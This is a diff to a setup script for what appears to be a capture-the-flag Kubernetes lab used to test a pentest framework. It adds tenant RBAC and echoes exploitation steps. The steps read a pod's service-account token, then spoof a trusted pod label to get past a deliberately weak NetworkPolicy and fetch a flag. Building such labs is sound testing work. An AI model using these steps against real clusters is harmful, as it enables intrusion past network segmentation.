@@ -9,9 +9,10 @@ k8s_init
 k8s_create_host_flag
 k8s_create_cluster
 k8s_wait_ready
+k8s_install_calico
 
 echo "[*] Pre-loading container images into KIND..."
-k8s_load_images alpine:latest nginx:1.24-alpine
+k8s_load_images alpine:latest nginx:1.24-alpine bitnami/kubectl:1.28
 
 echo "[*] Setting up namespaces and NetworkPolicy..."
 k8s_apply << 'YAML'
@@ -106,7 +107,41 @@ spec:
       imagePullPolicy: IfNotPresent
       command: ["sleep", "3600"]
 ---
-# Attacker pod (initially blocked by NetworkPolicy)
+# Tenant RBAC: attacker-sa can only manage pods inside attacker-ns
+apiVersion: v1
+kind: ServiceAccount
+metadata:
+  name: attacker-sa
+  namespace: attacker-ns
+---
+apiVersion: rbac.authorization.k8s.io/v1
+kind: Role
+metadata:
+  name: attacker-pods
+  namespace: attacker-ns
+rules:
+  - apiGroups: [""]
+    resources: ["pods"]
+    verbs: ["create", "get", "list", "update", "delete"]
+  - apiGroups: [""]
+    resources: ["pods/exec"]
+    verbs: ["create"]
+---
+apiVersion: rbac.authorization.k8s.io/v1
+kind: RoleBinding
+metadata:
+  name: attacker-pods
+  namespace: attacker-ns
+subjects:
+  - kind: ServiceAccount
+    name: attacker-sa
+    namespace: attacker-ns
+roleRef:
+  kind: Role
+  name: attacker-pods
+  apiGroup: rbac.authorization.k8s.io
+---
+# Attacker pod (initially blocked by NetworkPolicy; restricted to attacker-ns by RBAC)
 apiVersion: v1
 kind: Pod
 metadata:
@@ -115,9 +150,10 @@ metadata:
   labels:
     app: attacker
 spec:
+  serviceAccountName: attacker-sa
   containers:
     - name: attacker
-      image: alpine:latest
+      image: bitnami/kubectl:1.28
       imagePullPolicy: IfNotPresent
       command: ["sleep", "3600"]
 YAML
@@ -141,17 +177,16 @@ echo "    Flag pod: $FLAG_POD"
 echo ""
 echo "    Exploitation steps:"
 echo "    1. Verify NetworkPolicy blocks the attacker pod:"
-echo "       kubectl exec -n attacker-ns attacker-pod -- wget -qO- --timeout=3 http://${FLAG_SVC_IP}:8080/flag"
+echo "       TOKEN=\$(kubectl exec -n attacker-ns attacker-pod -- cat /var/run/secrets/kubernetes.io/serviceaccount/token)"
+echo "       kubectl --token=\$TOKEN exec attacker-pod -n attacker-ns -- wget -qO- --timeout=3 http://${FLAG_SVC_IP}:8080/flag"
 echo "       # This should fail - NetworkPolicy blocks non-frontend pods"
 echo "    2. Discover that NetworkPolicy uses label tier=frontend for access"
-echo "    3. Escalate to modify pod labels or create a pod with tier=frontend label:"
-echo "       kubectl label pod attacker-pod -n attacker-ns tier=frontend --overwrite"
-echo "       # But attacker pod is in different namespace... need alternative"
-echo "    4. Create a new pod in isolated-ns with tier=frontend label:"
-echo "       kubectl run bypass-pod --image=alpine:latest -n isolated-ns \\"
-echo "         --labels='tier=frontend' -- sleep 3600"
+echo "    3. The policy trusts the tier=frontend label from ANY namespace (namespaceSelector: {})"
+echo "    4. Spoof the label inside attacker-ns (the attacker's own tenant):"
+echo "       kubectl --token=\$TOKEN label pod attacker-pod -n attacker-ns tier=frontend --overwrite"
+echo "       # or: kubectl --token=\$TOKEN run bypass-pod -n attacker-ns --image=alpine --labels='tier=frontend' -- sleep 3600"
 echo "    5. From bypass-pod, access the flag:"
-echo "       kubectl exec -n isolated-ns bypass-pod -- wget -qO- http://${FLAG_SVC_IP}:8080/flag"
+echo "       kubectl --token=\$TOKEN exec attacker-pod -n attacker-ns -- wget -qO- http://${FLAG_SVC_IP}:8080/flag"
 echo ""
 echo "    Note: This scenario tests the pentest framework's ability to"
-echo "    identify and bypass NetworkPolicy-based segmentation."
+echo "    identify label-trusted NetworkPolicy and bypass it from the attacker's own tenant."
